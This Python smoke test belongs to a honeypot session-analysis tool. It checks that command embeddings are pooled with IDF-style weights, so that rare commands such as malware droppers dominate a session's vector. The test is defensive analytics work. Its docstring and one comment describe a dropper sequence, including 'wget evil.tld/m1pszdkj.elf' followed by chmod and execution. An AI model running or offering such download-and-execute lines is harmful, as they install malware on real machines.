"""Smoke test for ROADMAP #19: session embedding mean-pool is now IDF-weighted.

Before the fix, every unique command in a session contributed equally to
the pooled session embedding. A session running `cd; ls; uname -a; wget;
chmod; ./payload` had the dropper diluted to 1/6 of the session vector.
Sessions cluster on the mean, so two sessions whose only meaningful
difference is the dropper command would end up at similar centroids.

The fix weights each command's contribution by an IDF-style factor:
`weight = log((N+1)/(occ+1))` with `N = _POOL_IDF_N = 100000`. Commands
with high `occurrence_count` (boilerplate — `ls`, `cd`) get small weight;
commands seen only once or twice (a unique dropper) get large weight and
dominate the pooled vector.

Standalone — no ES, no pytest. Pure-function tests of `_idf_pool_weight`
plus an end-to-end exercise of weighted `_mean_pool`.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_idf_pool_weight.py
"""
from __future__ import annotations

import math
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from enrich.sources.cowrie.sessions import (
    _POOL_IDF_N,
    _idf_pool_weight,
    _mean_pool,
)


PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


def _norm(v: list[float]) -> float:
    return math.sqrt(sum(x * x for x in v))


def _cos(a: list[float], b: list[float]) -> float:
    na, nb = _norm(a), _norm(b)
    if na == 0 or nb == 0:
        return 0.0
    return sum(x * y for x, y in zip(a, b)) / (na * nb)


# -----------------------------------------------------------------------------
# [1] _idf_pool_weight — monotonic in occurrence_count.
# -----------------------------------------------------------------------------
print("\n[1] IDF weight is monotonically decreasing in occurrence_count")
w_rare = _idf_pool_weight(1)
w_mid = _idf_pool_weight(100)
w_common = _idf_pool_weight(10000)
check(
    "rare command (occ=1) > mid (occ=100) > common (occ=10000)",
    w_rare > w_mid > w_common > 0,
    f"got rare={w_rare:.3f} mid={w_mid:.3f} common={w_common:.3f}",
)
# Concrete: occ=1 → log(100001/2) ≈ 10.82
expected_rare = math.log((_POOL_IDF_N + 1.0) / 2.0)
check(
    "occ=1 produces the expected log value",
    abs(w_rare - expected_rare) < 1e-9,
    f"got {w_rare}, expected {expected_rare}",
)


# -----------------------------------------------------------------------------
# [2] Defensive: None / 0 / negative occurrence_count → weight as if occ=1.
# -----------------------------------------------------------------------------
print("\n[2] defensive input handling")
check(
    "None occurrence_count → weight as if occ=1",
    abs(_idf_pool_weight(None) - w_rare) < 1e-9,
    "",
)
check(
    "occ=0 → weight as if occ=1 (no log(N+1)/log(1) blow-up)",
    abs(_idf_pool_weight(0) - w_rare) < 1e-9,
    "",
)
check(
    "negative occ treated as occ=1",
    abs(_idf_pool_weight(-5) - w_rare) < 1e-9,
    "",
)


# -----------------------------------------------------------------------------
# [3] Outlier clamping: occ > N saturates at weight 0 (not negative).
# -----------------------------------------------------------------------------
print("\n[3] occ above N saturates at 0, not negative")
w_huge = _idf_pool_weight(_POOL_IDF_N * 10)
check(
    "occ ≫ N → weight is 0 (clamped), never negative",
    w_huge == 0.0,
    f"got {w_huge}",
)


# -----------------------------------------------------------------------------
# [4] Headline: a session with 5 boilerplate commands + 1 dropper produces
# a session embedding much closer to the dropper than to the boilerplate
# centroid. Under the old (uniform) pool the dropper would be 1/6 of the
# signal; under IDF weighting the dropper dominates because it's rare.
# -----------------------------------------------------------------------------
print("\n[4] dropper dominates the pooled vector, not boilerplate")
# 5 boilerplate commands all pointing the same way in embedding space
# (call it the +x axis). 1 dropper pointing at +y, with a very low
# occurrence_count (rare command).
boilerplate_dir = [1.0, 0.0]
dropper_dir = [0.0, 1.0]
embeddings = [
    boilerplate_dir,  # ls       (occ=10000 — corpus-wide common)
    boilerplate_dir,  # cd       (occ=10000)
    boilerplate_dir,  # uname -a (occ= 5000)
    boilerplate_dir,  # chmod    (occ= 5000)
    boilerplate_dir,  # echo     (occ= 8000)
    dropper_dir,      # wget evil.tld/m1pszdkj.elf (occ=1 — fresh dropper)
]
occs = [10000, 10000, 5000, 5000, 8000, 1]
weights = [_idf_pool_weight(o) for o in occs]

old_uniform = _mean_pool(embeddings)              # weights=None → uniform
new_weighted = _mean_pool(embeddings, weights)

cos_dropper_uniform = _cos(old_uniform, dropper_dir)
cos_dropper_weighted = _cos(new_weighted, dropper_dir)

# Under uniform pooling, dropper is 1 of 6 → cosine to dropper ~ 0.4
# Under IDF weighting, dropper weight ~10.8 vs boilerplate ~2.3 → much higher cos
check(
    "weighted pool is much closer to the rare dropper than uniform is",
    cos_dropper_weighted > cos_dropper_uniform + 0.2,
    f"uniform={cos_dropper_uniform:.3f}  weighted={cos_dropper_weighted:.3f}",
)
check(
    "weighted pool's dropper cosine is high (>= 0.6)",
    cos_dropper_weighted >= 0.6,
    f"got cos={cos_dropper_weighted:.3f}",
)


# -----------------------------------------------------------------------------
# [5] Sanity: when all occurrence_counts are equal, weighted == uniform.
# -----------------------------------------------------------------------------
print("\n[5] equal occurrence_counts: weighted output ≈ uniform output")
emb = [[1.0, 0.0, 0.0], [0.0, 1.0, 0.0], [0.0, 0.0, 1.0]]
ws = [_idf_pool_weight(50)] * 3
uniform = _mean_pool(emb)
weighted = _mean_pool(emb, ws)
check(
    "equal weights → output matches uniform pool",
    all(abs(a - b) < 1e-9 for a, b in zip(uniform, weighted)),
    f"uniform={uniform} weighted={weighted}",
)


# -----------------------------------------------------------------------------
# [6] Length mismatch raises ValueError.
# -----------------------------------------------------------------------------
print("\n[6] weights/embeddings length mismatch raises")
try:
    _mean_pool([[1.0, 0.0], [0.0, 1.0]], [1.0])
    check("mismatched lengths should raise", False, "no exception raised")
except ValueError:
    check("mismatched lengths raise ValueError", True, "")


# -----------------------------------------------------------------------------
# [7] Zero-weight inputs are skipped (boilerplate at the N saturation point
# should contribute nothing; result should look like the non-saturated input
# pool only).
# -----------------------------------------------------------------------------
print("\n[7] zero-weight inputs are skipped")
emb = [[1.0, 0.0, 0.0], [0.0, 1.0, 0.0]]
out = _mean_pool(emb, [0.0, 1.0])
# Pool of just [+y] → normalized → [0, 1, 0]
check(
    "zero-weight input dropped → output equals the surviving input direction",
    abs(out[0]) < 1e-9 and abs(out[1] - 1.0) < 1e-9 and abs(out[2]) < 1e-9,
    f"got {out}",
)


# -----------------------------------------------------------------------------
# [8] Output is unit-norm under weighted pooling.
# -----------------------------------------------------------------------------
print("\n[8] weighted pool output is unit-norm")
emb = [[1.0, 1.0, 0.0], [2.0, 0.0, 1.0], [0.0, 3.0, -1.0]]
ws = [0.5, 2.0, 1.3]
out = _mean_pool(emb, ws)
check(
    "weighted output is unit-norm",
    abs(_norm(out) - 1.0) < 1e-9,
    f"|out|={_norm(out)}",
)


# -----------------------------------------------------------------------------
# [9] Backward compat: weights=None still works identically to pre-#19.
# Pool of [+x, +y] uniform should still sit at the bisector.
# -----------------------------------------------------------------------------
print("\n[9] backward-compat: weights=None is the existing uniform pool")
out = _mean_pool([[1.0, 0.0], [0.0, 1.0]])
expected_dir = [1 / math.sqrt(2), 1 / math.sqrt(2)]
check(
    "weights=None gives the same bisector result as before",
    abs(out[0] - expected_dir[0]) < 1e-9 and abs(out[1] - expected_dir[1]) < 1e-9,
    f"got {out}, expected {expected_dir}",
)


# -----------------------------------------------------------------------------
# Summary
# -----------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
